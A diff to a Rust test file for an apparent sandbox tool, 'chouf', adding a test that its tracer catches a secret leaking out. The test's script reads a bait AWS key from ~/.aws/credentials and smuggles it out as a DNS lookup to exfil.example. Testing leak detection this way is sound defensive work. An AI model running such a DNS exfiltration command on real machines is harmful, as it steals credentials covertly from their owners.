@@ -206,3 +206,22 @@ fn a_patient_thief_is_caught_by_setting_off_what_it_left() {
         assert!(!text.contains("head -c 65536"), "chouf's own reads stay out:\n{text}");
     }
 }
+
+/// Proof of theft: a bait's mark seen in what the sandbox sends, here hidden in a DNS question (a real exfiltration
+/// trick, and the resolver is always reachable).
+#[test]
+#[ignore]
+fn a_secret_leaving_the_machine_is_proven() {
+    if !std::path::Path::new("/run/chouf-trace.sock").exists() {
+        eprintln!("skipped: chouf-trace is not running");
+        return;
+    }
+    // the AWS bait holds "AKIA<MARK>"; its lower-case mark becomes a DNS label
+    let script = "m=$(grep -o 'AKIA[0-9A-F]*' ~/.aws/credentials | cut -c5- | tr A-F a-f); getent hosts \"$m.exfil.example\" >/dev/null; exit 0";
+    let (code, text, j) = chouf(&["run", "--", "bash", "-c", script]);
+    assert_eq!(code, 1, "{text}");
+    assert!(text.contains("PROOF: your AWS access keys left the machine"), "{text}");
+    let l = &j["activity"]["leaks"][0];
+    assert_eq!(l["port"], 53, "{text}");
+    assert!(l["by"].as_str().unwrap().starts_with("getent hosts"), "{text}");
+}
